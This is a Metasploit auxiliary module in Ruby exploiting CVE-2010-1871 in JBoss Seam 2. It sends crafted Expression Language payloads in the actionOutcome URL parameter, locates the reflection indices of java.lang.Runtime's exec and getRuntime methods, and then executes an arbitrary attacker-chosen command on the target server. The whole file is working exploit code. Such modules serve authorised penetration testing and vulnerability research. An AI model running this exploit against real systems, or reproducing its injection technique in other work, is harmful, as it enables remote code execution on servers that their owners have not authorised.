##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::HttpClient

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'JBoss Seam 2 Remote Command Execution',
			'Description'     => %q{
					JBoss Seam 2 (jboss-seam2), as used in JBoss Enterprise Application Platform
				4.3.0 for Red Hat Linux, does not properly sanitize inputs for JBoss Expression
				Language (EL) expressions, which allows remote attackers to execute arbitrary code
				via a crafted URL. This modules is already successfully tested againt IBM WebSphere
				6.1 running on iSeries.

				NOTE: this is only a vulnerability when the Java Security Manager is not properly
				configured.
			},
			'Author'          => [ 'guerrino di massa', 'Cristiano Maruti <cmaruti[at]gmail.com>' ],
			'License'         => MSF_LICENSE,
			'References'      =>
				[
					[ 'CVE', '2010-1871' ],
					[ 'OSVDB', '66881']
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Jul 19 2010'))

		register_options(
			[
				Opt::RPORT(8080),
				OptString.new('JBOSS_ROOT',[ true, 'JBoss root directory', '/']),
				OptString.new('URI',[ true, 'Target URI', 'seam-booking/home.seam']),
				OptString.new('CMD', [ true, "The command to execute."])
			], self.class)
	end

	def run
		jbr = normalize_uri(datastore['JBOSS_ROOT'] + datastore['URI'])
		cmd_enc = ""
		cmd_enc << Rex::Text.uri_encode(datastore["CMD"])

		flag_found_one = 255
		flag_found_two = 255

		uri_part_1 = "?actionOutcome=/pwn.xhtml?pwned%3d%23{expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
		uri_part_2 = "].invoke(expressions.getClass().forName('java.lang.Runtime').getDeclaredMethods()["
		uri_part_3 = "].invoke(null),'"

		25.times do |index|
			req = jbr + uri_part_1 + index.to_s + "]}"

			res = send_request_cgi(
				{
					'uri'    => req,
					'method' => 'GET',
				}, 20)

			if (res.headers['Location'] =~ %r(java.lang.Runtime.exec\%28java.lang.String\%29))
				flag_found_one = index
				print_status("Found right index at [" + index.to_s + "] - exec")
			elsif (res.headers['Location'] =~ %r(java.lang.Runtime\+java.lang.Runtime.getRuntime))
				print_status("Found right index at [" + index.to_s + "] - getRuntime")
				flag_found_two = index
			else
				print_status("Index [" + index.to_s + "]")
			end
		end

		if (flag_found_one != 255 && flag_found_two != 255 )
			print_status("Target appears VULNERABLE!")
			print_status("Sending remote command:" + datastore["CMD"])

			req = jbr + uri_part_1 + flag_found_one.to_s + uri_part_2 + flag_found_two.to_s + uri_part_3 + cmd_enc + "')}"

			res = send_request_cgi(
				{
					'uri'    => req,
					'method' => 'GET',
				}, 20)

			if (res.headers['Location'] =~ %r(pwned=java.lang.UNIXProcess))
				print_status("Exploited successfully")
			else
				print_status("Exploit failed.")
			end
		else
			print_error("Target appears not vulnerable!")
		end
	end
end
